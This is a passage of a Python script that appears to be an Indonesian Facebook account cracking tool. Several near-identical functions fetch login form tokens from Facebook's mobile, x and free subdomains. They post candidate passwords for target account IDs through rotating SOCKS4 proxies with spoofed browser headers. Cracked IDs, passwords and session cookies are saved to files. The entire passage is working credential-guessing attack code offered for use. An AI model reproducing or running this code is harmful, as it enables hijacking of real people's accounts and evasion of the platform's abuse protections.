				otw.submit(metode4,idinya,pwx)
			elif 'metode6' in metode:
				otw.submit(metode6,idinya,pwx)
			elif 'metode8' in metode:
				otw.submit(metode8,idinya,pwx)
			elif 'metode9' in metode:
				otw.submit(metode9,idinya,pwx)
			elif 'metode7' in metode:
				otw.submit(metode7,idinya,pwx)
			elif 'metode11' in metode:
				otw.submit(metode11,idinya,pwx)
			elif 'metode13' in metode:
				otw.submit(metode13,idinya,pwx)
			elif 'metode12' in metode:
				otw.submit(metode12,idinya,pwx)
			elif 'metode10' in metode:
				otw.submit(metode10,idinya,pwx)
			elif 'metode14' in metode:
				otw.submit(metode14,idinya,pwx)
			elif 'metode15' in metode:
				otw.submit(metode15,idinya,pwx)
			elif 'metode16' in metode:
				otw.submit(metode16,idinya,pwx)
			elif 'graph' in metode:
				otw.submit(graph,idinya,pwx)
			else:print('kontol')
	print('\n==================================================')
	print(' [+] Crack process completed')
	print(' [+] Akun OK Tersimpan Di tamsisOK/'+svo)
	print(' [+] Akun CP Tersimpan Di tamsisCP/'+svc)
	print('==================================================')
	exit()
def metode12(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mobile-reguler# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			kode = tamsis.get('https://m.facebook.com/login/?email='+idi).text
			data ={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			hulu={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/?email='+idi,'accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'}
			tamsis.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode3(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mobile-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host": "m.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			kode = tamsis.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {'lsd': re.search('name="lsd" value="(.*?)"',str(kode)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(kode)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(kode)).group(1), 'li': re.search('name="li" value="(.*?)"',str(kode)).group(1), 'email': idi, 'pass': pw,'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(kode)).group(1)}
			hulu = {"Host": "m.facebook.com", "content-length": "10", "x-fb-lsd": '<re.Match object; span=(10302, 10332), match=''name="lsd" value="AVo4FeaGu1Y"''>', "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://m.facebook.com", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://m.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			tamsis.post("https://m.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode14(idi,sandi):
	global cp,ok,loop
	print(f'\r#X-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host": "x.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			kode = tamsis.get(f"https://x.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fx.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {'lsd': re.search('name="lsd" value="(.*?)"',str(kode)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(kode)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(kode)).group(1), 'li': re.search('name="li" value="(.*?)"',str(kode)).group(1), 'email': idi, 'pass': pw,'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(kode)).group(1)}
			hulu = {"Host": "x.facebook.com", "content-length": "10", "x-fb-lsd": '<re.Match object; span=(10302, 10332), match=''name="lsd" value="AVo4FeaGu1Y"''>', "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://x.facebook.com", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://x.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fx.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			tamsis.post("https://x.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Fx.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode2(idi,sandi):
	global cp,ok,loop
	print(f'\r#Free-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host": "free.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			kode = tamsis.get(f"https://free.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {'lsd': re.search('name="lsd" value="(.*?)"',str(kode)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(kode)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(kode)).group(1), 'li': re.search('name="li" value="(.*?)"',str(kode)).group(1), 'email': idi, 'pass': pw,'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(kode)).group(1)}
			hulu = {"Host": "free.facebook.com", "content-length": "10", "x-fb-lsd": '<re.Match object; span=(10302, 10332), match=''name="lsd" value="AVo4FeaGu1Y"''>', "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://free.facebook.com", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://free.facebook.com/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			tamsis.post("https://free.facebook.com/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2Ffree.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode11(idi,sandi):
	global cp,ok,loop
	print(f'\r#Feee-regular# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu={'Host': 'free.facebook.com','content-length': '169','cache-control': 'max-age=0','viewport-width': '980','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': 'Android','sec-ch-ua-platform-version': '9.0.0','sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			kode=tamsis.get('https://free.facebook.com/login/device-based/regular/login/').text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
